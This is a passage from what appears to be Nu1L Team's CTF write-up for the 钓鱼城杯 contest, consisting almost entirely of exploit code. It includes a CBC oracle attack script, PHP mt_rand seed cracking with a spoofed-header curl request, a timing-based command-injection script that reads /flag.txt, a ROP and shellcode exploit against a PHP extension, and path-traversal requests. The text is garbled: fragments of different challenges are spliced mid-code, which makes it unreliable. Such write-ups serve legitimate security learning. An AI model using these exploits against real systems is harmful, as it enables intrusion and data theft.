钓鱼城杯-WP
Author:Nu1L Team
钓鱼城杯-WP
Crypto
confused_ﬂag
crypto0
WEB
easyseed
easyweb
gamebox
zblog
RE
Faker
Goodbye
reg
APK
LinkChecker
PWN
fsplayground
unknown
veryeasy
Misc
whitespace
张三的恶行
Crypto
confused_ﬂag
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
# context.log_level = 'debug'
flag = [{} for _ in range(48)]
candidates = []
for _ in range(1000):
    try:
        io = remote('119.3.45.222', 9999)
        tmp = io.recvline().strip()
        if tmp.startswith(b'flag{'):
            candidates.append(tmp)
        # print(tmp)
        for idx, value in enumerate(tmp):
            if value in flag[idx].keys():
                flag[idx][value] += 1
            else:
                flag[idx][value] = 1
        io.close()
    except:
crypto0
        pass
for i in range(48):
    tmp = list(flag[i].items())
    tmp = sorted(tmp, key=lambda x: x[1], reverse=True)
    print(list(map(lambda x: (chr(x[0]), x[1]), tmp))[:3])
for candidate in candidates:
    print(candidate)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import fuckpy3
# context.log_level = 'debug'
import string
table = string.printable.encode()
def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
def hex_xor(h1, h2):
    return byte_xor(h1.unhex(), h2.unhex()).hex().encode()
io = remote('122.112.254.205', 10003)
io.sendlineafter('> ', '1')
io.sendlineafter(': ', '00'*16)
c = io.recvline().strip()
c0 = c[:32]
iv = c[-32:]
io.sendlineafter('> ', '1')
io.sendlineafter(': ', hex_xor('00'*16, iv))
c = io.recvline().strip()
c00 = c[:32]
iv = c[-32:]
# flag = b''
# for i in range(16):
#     flag_iv = c00[-(i+1)*2:]
#     io.sendlineafter('> ', '1')
#     io.sendlineafter(': ', hex_xor('00'*16, iv) + hex_xor(c00, '00'*(15-i)))
#     c = io.recvline().strip()
#     c0 = c[32:64]
#     iv = c[-32:]
#     std = c0
#     print(c0, iv)
#     for candidate in table:
#         io.sendlineafter('> ', '1')
#         io.sendlineafter(': ', hex_xor('00'*16, iv) + hex_xor(c00, b'00'*(15-
i)+hex_xor(flag.hex().encode() +
#                                                                               
          hex(candidate)[2:].zfill(2).encode(), flag_iv)))
#         c = io.recvline().strip()
#         c0 = c[32:64]
#         iv = c[-32:]
#         if c0 == std:
#             print(candidate)
#             flag += chr(candidate).encode()
#             print(flag)
#             break
# _______________f lag{1f5205a05b6?
# flag = b'flag{1f5205a05b6'
# for i in range(16):
#     flag_iv = c00[-(i+1)*2:]
#     io.sendlineafter('> ', '1')
#     io.sendlineafter(': ', hex_xor('00'*16, iv) + hex_xor(c00, '00'*(15-i)))
#     c = io.recvline().strip()
#     c01 = c[32:64]
#     c0 = c[64:96]
#     iv = c[-32:]
#     std = c0
#     print(c0, iv)
#     flag_iv1 = c01
#     # io.sendlineafter('> ', '1')
#     # io.sendlineafter(': ', hex_xor('00'*16, iv) + hex_xor(c00, b'00'*(15-
i)+hex_xor(flag[:i].hex(), flag_iv)))
#     # c = io.recvline().strip()
#     # c0 = c[64:96]
#     # iv = c[-32:]
#     # std = c0
#     # print(c0, iv)
#     for candidate in table:
#         io.sendlineafter('> ', '1')
#         payload = hex_xor('00'*16, iv) + hex_xor(c00, b'00'*(15-
i)+hex_xor(flag[:i+1].hex(), flag_iv)) + hex_xor(c01, 
hex_xor(flag[i+1:].hex().encode() +
#                                                                               
                                                hex(candidate)
[2:].zfill(2).encode(), flag_iv1))
#         io.sendlineafter(': ', payload)
#         c = io.recvline().strip()
#         c0 = c[64:96]
#         iv = c[-32:]
#         if c0 == std:
#             print(candidate)
#             flag += chr(candidate).encode()
#             print(flag)
#             break
flag = b'flag{1f5205a05b6f4e28478b79e681d'
print(len(flag))
for i in range(16):
    flag_iv = c00[-(i+1)*2:]
    io.sendlineafter('> ', '1')
    io.sendlineafter(': ', hex_xor('00'*16, iv) + hex_xor(c00, '00'*(15-i)))
    c = io.recvline().strip()
    c01 = c[32:64]
WEB
easyseed
http://122.112.252.28:20001/index.bak
easyweb
post: cmd, 命令盲注
    c02 = c[64:96]
    c0 = c[96:128]
    iv = c[-32:]
    std = c0
    print(c0, iv)
    flag_iv1 = c01
    flag_iv2 = c02
    # io.sendlineafter('> ', '1')
    # io.sendlineafter(': ', hex_xor('00'*16, iv) + hex_xor(c00, b'00'*(15-
i)+hex_xor(flag[:i].hex(), flag_iv)))
    # c = io.recvline().strip()
    # c0 = c[64:96]
    # iv = c[-32:]
    # std = c0
    # print(c0, iv)
    for candidate in table:
        io.sendlineafter('> ', '1')
        payload = hex_xor('00'*16, iv) + hex_xor(c00, b'00'*(15-
i)+hex_xor(flag[:i+1].hex(), flag_iv)) + hex_xor(c01, 
hex_xor(flag[i+1:i+17].hex(), flag_iv1)) + hex_xor(c02, 
hex_xor(flag[i+17:].hex().encode() +
                     hex(candidate)[2:].zfill(2).encode(), flag_iv2))
        io.sendlineafter(': ', payload)
        c = io.recvline().strip()
        c0 = c[96:128]
        iv = c[-32:]
        if c0 == std:
            print(candidate)
            flag += chr(candidate).encode()
            print(flag)
            break
./php_mt_seed 21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51
string(16) "nRtqGR8mtd9ZOPyI"
string(6) "vEUHaY"
string(16) "u9B4SlPNdAMbgnFc"
string(6) "vEUHaY"
curl -vv 122.112.252.28:20001 --cookie "lock=vEUHaY; key=nRtqGR8mtd9ZOPyI" -H 
"X-Forwarded-For: 127.0.0.1"
gamebox
import requests
import string
import time
alphalist = '}' + string.ascii_letters + string.digits
#print(alphalist)
flag = 'flag{'
url = 'http://119.3.37.185/'
while flag[-1:] != '}':
    for tmp in alphalist:
        payload = "grep -e '{}' /flag.txt && sleep 3".format(flag + tmp)
        data = {"cmd": payload}
        try:
            s = requests.post(url, data = data, timeout = 3)
        except:
            flag += tmp
            print(flag)
            break
curl "http://122.112.218.163:10080/?f=/usr/local/lib/php/extensions/no-debug-
non-zts-20170718/FileReader.so" > file.so
from urllib import quote
from pwn import *
context.arch = 'amd64'
def gamebox(buf):
    tmp = '$str="'
    tmp += str(quote(buf))
    tmp += '";'
    tmp += "$str=urldecode($str);"
    tmp += "gamebox($str);"
    return tmp
# lib = ELF("./libc-2.27.so")
# libc = 0x00007ffff5e25000
# stack = 0x00007ffffffde000
# pop_rdi = 0x000000000002155f+libc
# pop_rsi = 0x0000000000023e8a+libc
# pop_rdx = 0x0000000000001b96+libc
# mprotect = lib.sym['mprotect']+libc
# system = lib.sym['system']+libc
# jmp_rsp = 0x0000000000002b1d+libc
lib = ELF("./libc.so")
libc = 0x7f40ce7f4000
stack = 0x7ffe5e8cb000
pop_rdi = 0x0000000000023a5f+libc
pop_rsi = 0x000000000002440e+libc
pop_rdx = 0x0000000000106725+libc
mprotect = lib.sym['mprotect']+libc
system = lib.sym['system']+libc
jmp_rsp = 0x000000000006cabd+libc
zblog
http://122.112.253.135/?title=../../../../../../../proc/self/fd/3
应该是个jar  不过有点问题 没法反编译
def rop(buf):
    tmp = ''
    for i in buf:
        tmp += ','+i+'\x3e'
    return tmp
shelcode = '''
    mov rdi,rsp
    add rdi,0x13
    mov rax,{sys}
    jmp rax
'''.format(sys=system)
shelcode = asm(shelcode)
tmp = '> /dev/shm\x00'''
payload += rop(shelcode+cmd)
success(hex(len(payload)))
payload = payload.ljust(511,'\x00')
tmp += gamebox(payload)
print tmp
# tmp += gamebox('\x01\x3e,\x80'+'1'*(503-8)+p64(one)[:6]+'\x01\x01,')
f = open("./test.php","w")
f.write(tmp)
f.close()
GET /?title=./../../../../../../../home/ctf/web/.idea/workspace.xml